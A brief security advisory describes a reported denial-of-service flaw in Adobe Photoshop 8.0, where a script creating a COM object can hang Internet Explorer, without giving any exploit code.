It has been reported that Adobe Photoshop may be prone to a denial of service vulnerability that may crash an instance of Internet Explorer. An attacker can exploit this issue by creating a script that attempts to create a COM object and enticing a user to execute the script in their browser. When the user executes the script via Internet Explorer, the Internet Explorer window hangs leading to a denial of service in the browser.

Adobe Photoshop 8.0 is reported to be prone to this issue, however, it is possible that other versions are affected as well.
